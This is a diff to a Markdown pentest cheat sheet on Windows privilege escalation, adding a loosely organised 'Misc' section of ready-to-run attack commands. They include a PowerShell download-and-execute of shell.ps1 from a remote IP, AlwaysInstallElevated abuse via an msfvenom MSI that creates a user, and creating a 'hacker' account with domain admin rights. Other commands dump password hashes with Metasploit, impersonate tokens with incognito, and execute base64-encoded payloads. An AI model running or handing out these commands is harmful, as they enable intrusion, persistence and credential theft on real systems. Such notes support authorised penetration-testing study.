@@ -261,21 +261,89 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 
 You can detect and exploit this vulnerability with metasploit using the module: `exploit/windows/local/trusted_service_path` You can manually create a service binary with msfvenom: `msfvenom -p windows/exec CMD="net localgroup administrators $username /add" -f exe-service -o service.exe`
 
-### Misc
+## Misc
 
-List domain administrators:
+TODO: Categorize each of these, prep for scripting, add descriptions
+
+### Download files with PowerShell
+
+#### Using System.Net.WebClient
+
+```text
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.26/shell.ps1', 'shell.ps1')
+```
+
+#### Using Invoke-WebRequest
+
+```text
+Invoke-WebRequest -Uri 'http://10.10.14.26/shell.ps1'-OutFile 'shell.ps1'
+```
+
+#### Download and Execute
+
+```text
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.26/shell.ps1')
+```
+
+### AlwaysInstall Elevated
+
+Allows non-privileged users to run executables as SYSTEM
+
+```text
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
+```
+
+### **AlwaysInstall Elevated**
+
+Allows non-privileged users to run executables as `NT AUTHORITY\SYSTEM`.  To check for this, query the below key
+
+```text
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+#### msfvenom
+
+```text
+msfvenom -p windows/adduser USER=bhanu PASS=bhanu123 -f msi -o create_user.msi
+```
+
+#### msiexec \(on victim machine\)
+
+```text
+msiexec /quiet /qn /i C:\create_user.msi
+```
+
+#### Metasploit module
+
+```text
+use exploit/windows/local/always_install_elevated
+```
+
+### **Add User**
+
+```text
+net user hacker hack3dpasswd /add
+```
+
+### **Make User Admin**
+
+```text
+net localgroup administrators hacker /add
+```
+
+### Get all members of "Domain Admins" group
 
 ```text
 net group "Domain Admins" /domain
 ```
 
-Dump password hashes \(Metasploit\)
+### Dump password hashes \(Metasploit\)
 
 ```text
 msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE
 ```
 
-Find admin users \(Metasploit\)
+### Find admin users \(Metasploit\)
 
 ```text
 spool /tmp/enumdomainusers.txt
@@ -288,7 +356,7 @@ msf > run
 msf> spool off
 ```
 
-Impersonate an administrator
+### Impersonate an administrator \(meterpreter\)
 
 ```text
 meterpreter > load incognito
@@ -298,17 +366,37 @@ meterpreter > getuid
 meterpreter > shell
 ```
 
-Add a user
+### Add a user
 
 ```text
-C:\> whoami
 C:\> net user hacker /add /domain
 C:\> net group "Domain Admins" hacker /add /domain
 ```
 
+### Covert to and from Base64 with PowerShell
 
+#### Convert to base64
 
-### References
+```text
+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('whoami'))
+# d2hvYW1p
+```
+
+#### Convert from base64
+
+```text
+[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('d2hvYW1p'))
+ # whoami
+```
+
+#### Execute a base64 payload in powershell
+
+```text
+powershell.exe -command "[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('d2hvYW1p'))"
+# hostname\username
+```
+
+## References
 
 * [http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled](http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled) - [@KunalAdapi](https://twitter.com/kunalUdapi)
 * [https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
